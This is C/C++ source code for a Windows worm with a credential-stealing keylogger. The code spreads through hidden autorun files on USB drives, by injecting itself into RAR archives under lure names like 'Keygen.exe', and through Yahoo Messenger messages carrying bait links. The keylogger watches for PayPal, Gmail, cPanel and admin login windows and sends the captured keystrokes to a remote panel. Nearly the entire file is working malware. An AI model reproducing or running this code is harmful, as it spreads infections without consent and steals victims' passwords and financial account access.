#include "include.h"

   /*\______________             ____                      ___________________
  /                /|  ,-,______/    \______/\________    /                   \
 /By: h1t3m       / | /_____   /      \   __  \       \  /                    /
/_____      _____/  | ___  /  /  /\    \ (__) /    ,\  \/                    /
     /     / \      |/ _ \/  /  (__)   /  __  \__  | \    /\                /
     \     \  \_______/ \____\________/   | \____\_|  \__/  \root@h1t3m.org/
	  \_____\                        |____|                  \___________*/

bool do_keylog = true;
char run_file[] = "_hfo-qevire.pbz"; //_usb-driver.com
char inf_file[] = "nhgbeha.vas"; //autorun.inf
//yahoo messages
static const char *yimhost[] = {
	":D",
	":P",
	":O",
	"Haha!",
	"OMG!!!",
	"Seen this?",
	":D <3",
	"Like my pic?",
	"Look!",
	"Whoes this?",
	"This you?",
	"Seen this before?",
	"Haha you got owned!!!",
	"Hot ;)",
	"oops...",
	NULL
};
//files to use with rar spread
static const char *rarexe[] = {
  "extract.com",
  "Extract.exe",
  "OpenRAR.exe",
  "AutoExtract.exe",
  "RAR_Update.exe",
  "Porno.mpeg.exe",
  "WinRAR_Update.exe",
  "Keygen.exe",
  "Autorun.exe",
  "rar_driver.com",
  "driver.com",
  "helper.exe",
  "view.exe",
  "music.exe",
  "e-book.exe",
  "pictures.exe",
  "photo_album.exe",
  NULL
};
//select random message
int randget(const char *messages[])
{
	int i = 0;
	for(;messages[i] != NULL;i++);
	return (rand() % i);
}
//generate random string of letters
char *GenerateRandomLetters(unsigned int len)
{
	char *rnd;
	unsigned int i;
	if (len == 0 || len > 10)
		len = rand()%(10-3) + 3;
	rnd = (char *) malloc (len + 1);
	for (i = 0; i <= len; i++)
		rnd[i] = (rand()%26) + 97;
	rnd[len] = 0;
	return rnd;
}
//rot13
char *r13(char hooch[256])
{
	char* woots = new char[256];
    int s = 0;
    do {
        if(hooch[s] <= 'm' && isalpha(hooch[s]) && islower(hooch[s])) {
            woots[s] = hooch[s] + 13;
         }
        else if(hooch[s] <= 'M' && isalpha(hooch[s]) && isupper(hooch[s])) {
            woots[s] = hooch[s] + 13;
        }
        else if(hooch[s] >= 'n' && isalpha(hooch[s]) && islower(hooch[s])) {
            woots[s] = hooch[s] - 13;       
        }
        else if(hooch[s] >= 'N' && isalpha(hooch[s]) && isupper(hooch[s])) {
            woots[s] = hooch[s] - 13;       
        }
        else {
            woots[s] = hooch[s];     
        }
        s++;
    } while(hooch[s] != '\0');
    woots[s] = '\0';
    return woots;
}

//USB Spread
void UsbPwn(char *remoteDrive)
{
	char usbPath[MAX_PATH], usbBuff[MAX_PATH];
	GetModuleFileNameA(0, usbPath, MAX_PATH);
	wsprintfA(usbBuff, "%s%s", remoteDrive, r13(run_file));
	if(!CopyFile(usbPath, usbBuff, true))
		return;
	else
	{
		SetFileAttributesA(usbBuff, FILE_ATTRIBUTE_HIDDEN);
		wsprintfA(usbBuff, "%s%s", remoteDrive, r13(inf_file));
		FILE *inf;
		inf = fopen(usbBuff, "w+");      
		fprintf(inf, r13("[nhgbeha]\n"));
		fprintf(inf, r13("bcra=%f\a"), r13(run_file));
		fprintf(inf, r13("vpba=%flfgrzebbg%\\flfgrz32\\Furyy32.qyy,4\a"));
		fprintf(inf, r13("npgvba=Bcra sbyqre\a"));
		fprintf(inf, r13("furyy\\bcra=Bcra\a"));
		fprintf(inf, r13("furyy\\bcra\\pbzznaq=%f\a"), r13(run_file));
		fprintf(inf, r13("furyy\\bcra\\qrsnhyg=1\a"));
		fclose(inf);
		SetFileAttributesA(usbBuff, FILE_ATTRIBUTE_HIDDEN);
		return;
	}
}
void FindRemoteDrive()
{
	char Drives[64], remoteDrive[3], tFile[256], dBuf[256];
	bool Pwn = true;
	while(Pwn)
	{
		int Length = GetLogicalDriveStringsA(sizeof(Drives), Drives);
		int bIndex = 0;
		for (int i = 0; i < Length; i++)
		{
			remoteDrive[bIndex] = Drives[i];
			bIndex++;
			if (Drives[i] == '\0')
			{
				if (GetDriveTypeA(remoteDrive) ==  DRIVE_REMOVABLE)
				{
					sprintf(tFile, "%s%s", remoteDrive, r13(run_file));
					FILE* fp = fopen(tFile, "r");
					if (fp) 
					{// file exists
						fclose(fp);
					} 
					else 
					{// file doesn't exist
						sprintf(dBuf, "%s%s", remoteDrive, r13(inf_file));
						DeleteFile(dBuf);
						Sleep(1000);
						UsbPwn(remoteDrive);
					}
				}
			bIndex = 0;
			}
		}
	Sleep(60000);
	}
}

// Keylogger
SYTES sytes[]={
		"Gmail: Email from Google",//gmail
		"Online Payment, Merchant Account - PayPal",//paypal
		"PayPal is the safer, easier way to pay - PayPal",//Paypal
		"Login - PayPal",//paypal
		"AlertPay.com - My Way To Pay | Secure Online Payments",//alertpay
		"Login",//LR
		"Login: Step 1",//LR
		"Login: Step 4",//LR
		"Transfer",//LR
		"Login: Step 1 of 2",//LR
		"cPanel&reg; 11",//Cpanel 11
		"cPanel® 11"//Cpanel 11
		"Warez-BB.org :: Log in",//Warez-bb.org
		"vBulletin Admin Control Panel",//Vbulletin admin CP
		"DirectAdmin Login",//Direct Admin
		"Invision Power Services :: Invision Power Services : Login",
		"IPB: ACP: Log in",//IPB Admin login
		"Steam Community",//steam
		"Sign In",// Hotmail
		"Santrex Internet Services - Client Area",
		"Santrex Internet Services - Support Tickets",
		"HyperVM 2.0",
		"ZeuS :: Login",
		"5h3l1@",
		" - Account Manager Login",
		"osCommerce Online Merchant Administration Tool",
		"Admin",
		"Administrator",
};
KEYS keys[]={
	{8,"b","b"},
	{13,"e","e"},
	{27,"[ESC]","[ESC]"},
	{112,"[F1]","[F1]"},
	{113,"[F2]","[F2]"},
	{114,"[F3]","[F3]"},
	{115,"[F4]","[F4]"},
	{116,"[F5]","[F5]"},
	{117,"[F6]","[F6]"},
	{118,"[F7]","[F7]"},
	{119,"[F8]","[F8]"},
	{120,"[F9]","[F9]"},
	{121,"[F10]","[F10]"},
	{122,"[F11]","[F11]"},
	{123,"[F12]","[F12]"},
	{192,"`","~"},
	{49,"1","!"},
	{50,"2","@"},
	{51,"3","#"},
	{52,"4","$"},
	{53,"5","%"},
	{54,"6","^"},
	{55,"7","&"},
	{56,"8","*"},
	{57,"9","("},
	{48,"0",")"},
	{189,"-","_"},
	{187,"=","+"},
	{9,"[TAB]","[TAB]"},
	{81,"q","Q"},
	{87,"w","W"},
	{69,"e","E"},
	{82,"r","R"},
	{84,"t","T"},
	{89,"y","Y"},
	{85,"u","U"},
	{73,"i","I"},
	{79,"o","O"},
	{80,"p","P"},
	{219,"[","{"},
	{221,"","}"},
	{65,"a","A"},
	{83,"s","S"},
	{68,"d","D"},
	{70,"f","F"},
	{71,"g","G"},
	{72,"h","H"},
	{74,"j","J"},
	{75,"k","K"},
	{76,"l","L"},
	{186,";",":"},
	{222,"'","\""},
	{90,"z","Z"},
	{88,"x","X"},
	{67,"c","C"},
	{86,"v","V"},
	{66,"b","B"},
	{78,"n","N"},
	{77,"m","M"},
	{188,",","<"},
	{190,".",">"},
	{191,"/",".?"},
	{220,"\\","|"},
	{17,"[CTRL]","[CTRL]"},
	{91,"[WIN]","[WIN]"},
	{32," "," "},
	{92,"[WIN]","[WIN]"},
	{44,"[PRSC]","[PRSC]"},
	{145,"[SCLK]","[SCLK]"},
	{45,"[INS]","[INS]"},
	{36,"[HOME]","[HOME]"},
	{33,"[PGUP]","[PGUP]"},
	{46,"[DEL]","[DEL]"},
	{35,"[END]","[END]"},
	{34,"[PGDN]","[PGDN]"},
	{37,"[LEFT]","[LEFT]"},
	{38,"[UP]","[UP]"},
	{39,"[RGHT]","[RGHT]"},
	{40,"[DOWN]","[DOWN]"},
	{144,"[NMLK]","[NMLK]"},
	{111,"/","/"},
	{106,"*","*"},
	{109,"-","-"},
	{107,"+","+"},
	{96,"0","0"},
	{97,"1","1"},
	{98,"2","2"},
	{99,"3","3"},
	{100,"4","4"},
	{101,"5","5"},
	{102,"6","6"},
	{103,"7","7"},
	{104,"8","8"},
	{105,"9","9"},
	{110,".","."}
};
int SaveKeys(char *key, char *windowtxt)
{
	char sendbuf[512];

	if(do_keylog)
	{
		for(int i=0;i < sizeof(sytes) / sizeof(SYTES);i++)
		{
			if(strstr(windowtxt, sytes[i].title))
			{
				_snprintf(sendbuf,sizeof(sendbuf),"%s (<font color=red>%s</font>)\n\r", key, sytes[i].title);

					char buffa[256];
					sprintf(buffa, "%s\\?do=paste&l=%s<br />",r13(t_panel), sendbuf);
					URLDownloadToFile(0,buffa,0,0,0);
			}
		}
	}
	return 0;
}
DWORD WINAPI KeyLogger(LPVOID param)
{
	char buffer[512], buffer2[512], windowtxt[61], mwindowtxt[61];
	int err = 0, x = 0, i = 0, state, shift, bKstate[256]={0};
	HWND active = GetForegroundWindow(), mactive;
	HWND old = active;
	GetWindowText(old,windowtxt,60);
	while (err == 0) {
		Sleep(8);
		active = GetForegroundWindow();
		if (active != old) {
			old = active;
			GetWindowText(old,windowtxt,60);
			if(do_keylog)
			{
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) < 1)
				{
					sprintf(buffer2, "%s", buffer); 
					err = SaveKeys(buffer2, windowtxt);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
				if((strlen(buffer)) > 0 && (strlen(windowtxt)) > 0)
				{
					sprintf(buffer2, "%s", buffer); 
					err = SaveKeys(buffer2, windowtxt);
					memset(buffer,0,sizeof(buffer));
					memset(buffer2,0,sizeof(buffer2));
				}
			}
		if(do_keylog)
		{
			if((GetAsyncKeyState(VK_LBUTTON)) == -32767 && (strlen(buffer)) > 0) {
				mactive = GetForegroundWindow();
				GetWindowText(mactive,mwindowtxt,60);
				sprintf(buffer2, "%s", buffer); 
				err = SaveKeys(buffer2, mwindowtxt);
				memset(buffer,0,sizeof(buffer));
				memset(buffer2,0,sizeof(buffer2));
			}
		}
		for (i = 0; i < 92; i++) {
			shift = GetKeyState(VK_SHIFT);
			x = keys[i].inputL;
			if (GetAsyncKeyState(x) & 0x8000) {
				if (((GetKeyState(VK_CAPITAL)) && (shift > -1) && (x > 64) && (x < 91)))
					bKstate[x] = 1;
				else if (((GetKeyState(VK_CAPITAL)) && (shift < 0) && (x > 64) && (x < 91)))
					bKstate[x] = 2;
				else if (shift < 0)
					bKstate[x] = 3;
				else bKstate[x] = 4;
			} else {
				if (bKstate[x] != 0) 
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) 
					{
						buffer[strlen(buffer)-1] = 0;
						continue;
					} 
					else if (strlen(buffer) > 511 - 70) 
					{
						active = GetForegroundWindow();
						GetWindowText(active,windowtxt,60);
						sprintf(buffer2,"%s (Buffer full) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					} 
					else if (x == 13) 
					{
						if (strlen(buffer) == 0) 
							continue;
						active = GetForegroundWindow();
						GetWindowText(active,windowtxt,60);
						sprintf(buffer2,"%s (Return) (%s)",buffer,windowtxt);
						err = SaveKeys(buffer2, windowtxt);
						memset(buffer,0,sizeof(buffer));
						memset(buffer2,0,sizeof(buffer2));
						continue;
					} 
					else if (state == 1 || state == 3)
						strcat(buffer,keys[i].outputH);
					else if (state == 2 || state == 4) 
						strcat(buffer,keys[i].outputL);
				}
			}
		}
	}
	}
	ExitThread(0);
}

// WinRAR Injection
#pragma pack(push, 1)
typedef struct RAR_FILE_HEADER
{
	WORD	HEAD_CRC;
	BYTE	HEAD_TYPE;
	WORD	HEAD_FLAGS;
	WORD	HEAD_SIZE;
	DWORD	PACK_SIZE;
	DWORD	UNP_SIZE;
	BYTE	HOST_OS;
	DWORD	FILE_CRC;
	DWORD	FTIME;
	BYTE	UNP_VER;
	BYTE	METHOD;
	WORD	NAME_SIZE;
	DWORD	ATTR;
}RarFileHeader;
#pragma pack(pop)
DWORD crc32(void *xdata,int xsize)
{
	HGLOBAL crc32table;
	DWORD retvalue;
	crc32table=GlobalAlloc(GPTR,0x400);
	if(crc32table!=NULL)
	{
		__asm
		{
			;build crc32 table
			;---------------------
			mov		edi,crc32table
			xor		ecx,ecx
	L2:		push	ecx
			mov		eax,ecx
			mov		ecx,8h
	L1:		mov		edx,eax
			and		edx,1h
			jne		equ_1
			shr		eax,1h
			jmp		__1
	equ_1:  shr		eax,1h
			xor		eax,0edb88320h ;polynomial
	__1:    loop	L1
			stosd
			pop		ecx
			inc		ecx
			cmp		ecx,100h
            jb		L2
			;calc crc32 checksum
			;-------------------
			mov		esi,xdata
			mov		edi,xsize
			xor		ecx,ecx
			mov		ebx,0ffffffffh
	crc:	push	ecx
			xor		eax,eax
			lodsb
			mov		edx,ebx
			shr		ebx,8h
			push	ebx
			xchg	edx,ebx
			and		ebx,0ffh
			xor		ebx,eax
			xchg	eax,ebx
			mov		ecx,4h
			mul		ecx
			xchg	eax,ebx
			mov		eax,crc32table
			add		eax,ebx
			mov		eax,dword ptr [eax]
			pop		ebx
			xor		eax,ebx
			mov		ebx,eax
			pop		ecx
			inc		ecx
			cmp		ecx,edi
			jb		crc
			not		eax
			mov		retvalue,eax
		}
		GlobalFree(crc32table);
		return(retvalue);
	}
	return 0;
}
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes)
{
	unsigned char RarMainHeader[20] =
	{
		0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x00, 0xCF, 0x90, 0x73,
		0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	};
	unsigned char EndOfRar[7]=
	{
		0xC4, 0x3D, 0x7B, 0x00, 0x40, 0x07, 0x00,
	};
	HANDLE hrarfile,hfile,hmap,mapbase;
	DWORD IO_Buffer,FileSize,RarFileSize;
	RarFileHeader RarHeader;
	char WorkBuffer[128],*WBp;
	hfile=CreateFile(FileToAdd,GENERIC_READ,FILE_SHARE_READ,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hfile==INVALID_HANDLE_VALUE)
		return FALSE;
	FileSize=GetFileSize(hfile,NULL);
	if(FileSize==0xFFFFFFFF)
	{
		CloseHandle(hfile);
		return FALSE;
	}
	hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hrarfile==INVALID_HANDLE_VALUE)
	{
		hrarfile=CreateFile(RarFile,GENERIC_WRITE,FILE_SHARE_READ,0,
		CREATE_NEW,FILE_ATTRIBUTE_NORMAL,0);
		if(hrarfile==INVALID_HANDLE_VALUE)
		{
			CloseHandle(hfile);
			return FALSE;
		}
		WriteFile(hrarfile,&RarMainHeader,sizeof(RarMainHeader),&IO_Buffer,NULL);
	}
	else
	{
		RarFileSize=GetFileSize(hrarfile,NULL);
		if(RarFileSize==0xFFFFFFFF)
		{
			CloseHandle(hfile);
			CloseHandle(hrarfile);
			return FALSE;
		}
		SetFilePointer(hrarfile,RarFileSize-sizeof(EndOfRar),NULL,FILE_BEGIN);
	}
	hmap=CreateFileMapping(hfile,NULL,PAGE_READONLY,NULL,NULL,NULL);
	if(hmap==NULL)
	{
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	mapbase=MapViewOfFile(hmap,FILE_MAP_READ,NULL,NULL,NULL);
	if(mapbase==NULL)
	{
		CloseHandle(hmap);
		CloseHandle(hfile);
		CloseHandle(hrarfile);
		return FALSE;
	}
	memset(&RarHeader,0,sizeof(RarHeader));
	RarHeader.HEAD_TYPE=0x74;
	RarHeader.FILE_CRC=crc32(mapbase,FileSize);
	RarHeader.HEAD_FLAGS=0x8000;
	RarHeader.METHOD=0x30;
	RarHeader.UNP_VER=0x14;
	RarHeader.ATTR=Attributes;
	RarHeader.UNP_SIZE=FileSize;
	RarHeader.PACK_SIZE=FileSize;
	RarHeader.NAME_SIZE=lstrlen(PackedFileName);
	RarHeader.HEAD_SIZE=(sizeof(RarHeader)+RarHeader.NAME_SIZE);
	memset(WorkBuffer,0,sizeof(WorkBuffer));
	memcpy(WorkBuffer,&RarHeader,sizeof(RarHeader));
	WBp=WorkBuffer;
	WBp+=sizeof(RarHeader);
	memcpy(WBp,PackedFileName,RarHeader.NAME_SIZE);
	crc32(WorkBuffer+2,sizeof(RarHeader)+RarHeader.NAME_SIZE-2);
	__asm
	{
		mov word ptr [RarHeader.HEAD_CRC],ax
	}
	WriteFile(hrarfile,&RarHeader,sizeof(RarHeader),&IO_Buffer,NULL);
	WriteFile(hrarfile,PackedFileName,RarHeader.NAME_SIZE,&IO_Buffer,NULL);
	WriteFile(hrarfile,mapbase,FileSize,&IO_Buffer,NULL);
	WriteFile(hrarfile,EndOfRar,sizeof(EndOfRar),&IO_Buffer,NULL);
	UnmapViewOfFile(mapbase);
	CloseHandle(hmap);
	CloseHandle(hfile);
	CloseHandle(hrarfile);
	return TRUE;
}
char wormpath[MAX_PATH];
void InfectDrive()
{
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	hfind=FindFirstFile("*.*",&wfd);
	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);
						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);
								const char *rar_exe;
								srand(GetTickCount());
								rar_exe = *(&rarexe[randget(rarexe)]);
								srand(GetTickCount());										
                                int i = rand() % sizeof(rar_exe) / sizeof(rar_exe[0]);
								char buffs[256];
								sprintf(buffs, rar_exe);
							AddToRar(fullpath,wormpath,buffs,FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}
DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="z:\\";
	UINT drive_type;
	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);
	do
	{
		drive_type=GetDriveType(Drive);	
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}
		Drive[0]--;
	}
	while(Drive[0]!='b');
	return 1;
}

/* Yahoo 8 Multi Language Spread */

char szWebLink[256];

char szWebLink2[256], szWebMsg[256];
char *GetLanguage(char *szBuffer, unsigned int nSize)
{
	const char *Yim_Host;
	srand(GetTickCount());
	Yim_Host = *(&yimhost[randget(yimhost)]);
	srand(GetTickCount());										
	int i = rand() % sizeof(Yim_Host) / sizeof(Yim_Host[0]);
	sprintf(szWebLink, r13(yim_link), "?photo=Funny_TWorm.jpg");
	sprintf(szWebLink2, Yim_Host);
	switch (GetSystemDefaultLangID())
	{
		case 0x040c: /* French */
		_snprintf(szBuffer, nSize, "regarder cette image %s", szWebLink);
		break;
		case 0x0407: /* German */
		_snprintf(szBuffer, nSize, "Schauen Sie dieses Bild an %s", szWebLink);
		break;
		case 0x040A: /* Spanish */
		_snprintf(szBuffer, nSize, "mire este retrato %s", szWebLink);
		break;
		case 0x0409: /* English */
		_snprintf(szBuffer, nSize, "%s %s?image=%s", szWebLink2, r13(yim_link), GenerateRandomLetters(8));
		break;
		case 0x0410: /* Italian */
		_snprintf(szBuffer, nSize, "guardare quest'immagine %s", szWebLink);
		break;
		default: /* Default English */
		_snprintf(szBuffer, nSize, "%s %s?image=%s", szWebLink2, r13(yim_link), GenerateRandomLetters(7));
		break;
	}
	return (szBuffer);
}
bool SendMessageToYahoo(char *szMessage)
{
   HWND hwndYahooWindow, hwndClass;
   HWND hwndMessage, hwndButton;
   if (!(hwndYahooWindow = FindWindow("YSearchMenuWndClass", NULL))) { return false; }
   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);
      if (!(hwndClass = FindWindowEx(hwndYahooWindow, 0, "IMClass", NULL))) { return false; }
      if (IsWindow(hwndClass))
      {
         if (!(hwndMessage = FindWindowEx(hwndClass, 0, "YIMInputWindow", NULL))) { return false; }
         SendMessage(hwndMessage, WM_SETTEXT, 0, (LPARAM)szMessage);
         Sleep(100);
      }

      if (IsWindow(hwndClass))
      {
         if (!(hwndButton = FindWindowEx(hwndClass, 0, "Button", "&Send"))) { return false; }
         SendMessage(hwndButton, WM_LBUTTONDOWN, 0, 0);
         SendMessage(hwndButton, WM_LBUTTONUP, 0, 0);
         Sleep(50);
      }
   }
   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_CLOSE, 0, 0);
      return true;
   }
   return false;
}

unsigned int Yahoo(char *szMessage)
{
   HWND hwndYahooWindow, hwndWindow;
   if (!(hwndYahooWindow = FindWindow("YahooBuddyMain", NULL))) { return 0; }
   if (IsWindow(hwndYahooWindow))
   {
      SendMessage(hwndYahooWindow, WM_COMMAND, 32891, 0);
      if (!(hwndWindow = FindWindowEx(hwndYahooWindow, 0, "YTopWindow", NULL))) { return 0; }
      if (IsWindow(hwndWindow))
      {
         hwndWindow = FindWindowEx(hwndWindow, 0, "YTabListManager", NULL);
         hwndWindow = FindWindowEx(hwndWindow, 0, "ATL:0084FD68", NULL);
         hwndWindow = FindWindowEx(hwndWindow, 0, "SysListView32", NULL);
         if (!hwndWindow) { return 0; }
         if (IsWindow(hwndWindow))
         {
            for (int i = ListView_GetSelectionMark(hwndWindow); i >= 0; --i)
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_UP, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_UP, 0);
            }
            for ( i = 0; i <= ListView_GetItemCount(hwndWindow); ++i )
            {
               SendMessage(hwndWindow, WM_KEYDOWN, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_DOWN, 0);
               SendMessage(hwndWindow, WM_KEYDOWN, VK_RETURN, 0);
               SendMessage(hwndWindow, WM_KEYUP, VK_RETURN, 0);
               SendMessageToYahoo(szMessage);
            }
         }
      }
   }
   return 0;
}

int YahSend()
{
	while(1)
	{
		char szMessage[256];
		if (GetLanguage(szMessage, sizeof(szMessage) - 1))
		Yahoo(szMessage);
		Sleep(15*60000); // Sleep 15 mins then resend
	}
	return 0;
} 